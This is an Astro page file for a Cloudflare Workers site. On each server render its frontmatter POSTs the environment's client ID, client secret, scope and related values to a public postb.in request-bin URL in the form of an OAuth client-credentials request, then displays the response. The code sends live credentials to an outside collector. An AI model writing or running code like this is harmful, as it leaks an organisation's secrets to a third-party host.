---
import Layout from "../layouts/Layout.astro";
import { env } from "cloudflare:workers";
let error = null;

let res = await fetch("https://www.postb.in/1769101939685-9943302432075", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: new URLSearchParams({
    client_id: env.CLIENT_ID,
    client_secret: env.CLIENT_SECRET,
    grant_type: "client_credentials",
    scope: env.ACCESS_SCOPE,
    soid: env.SOID,
    environment: import.meta.env.MODE,
  }),
});
---

<Layout>
  <section class="p-8">
    <h1 class="text-4xl font-bold mb-4">Environment Variables</h1>
    <div class="mb-4">
      <h2 class="text-2xl font-semibold">
        Cloudflare {import.meta.env.MODE} Environment Variables:
      </h2>
      <pre
        class="bg-gray-100 p-4 rounded">
        RESPONSE {JSON.stringify(res, null, 2)}
      </pre>
      <pre class="bg-gray-100 p-4 rounded"></pre>
    </div>
  </section>
</Layout>
